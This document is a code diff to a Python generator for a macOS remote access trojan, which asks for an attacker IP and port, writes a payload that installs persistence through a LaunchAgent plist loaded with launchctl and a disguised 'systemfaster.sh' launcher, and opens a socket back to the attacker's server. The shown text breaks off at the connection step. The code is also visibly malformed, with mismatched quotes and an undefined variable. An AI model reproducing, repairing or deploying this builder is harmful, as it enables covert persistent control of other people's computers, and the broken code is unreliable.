@@ -1,7 +1,9 @@
 import os
 ip = input("Enter IP: ")
-b = ("{p}") 
 a = '"'
+f = 'f"""'
+c = '"""'
+b = "{p}"
 port = int(input("Enter port: "))
 NAME = input("Enter name of script: ")
 other_python_script = f"""
@@ -9,10 +11,12 @@ import socket
 import subprocess
 import os
 p = os.path.dirname(os.path.abspath(__file__))
-setsidrat = ("setsid python3", p)
+setsidrat = ("setsid python3 ")
 with open("systemfaster.sh", " w") as python_script_file:
     python_script_file.write(setsidrat)
-daemon = ("<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+daemon = {f}
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
@@ -26,13 +30,14 @@ daemon = ("<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
 
     </array>
 </dict>
-</plist>")
+</plist>')
+{c}
 with open("com.example.exampld.plist", "w") as python_script_file:
     python_script_file.write(l)
 os.system("launchctl load Library/LaunchAgents/com.example.exampld.plist")
 SERVER_HOST = {a+ip+a}
 SERVER_PORT = {port}
-BUFFER_SIZE = 1024")
+BUFFER_SIZE = "1024"
 # create the socket object
 s = socket.socket()
 # connect to the server
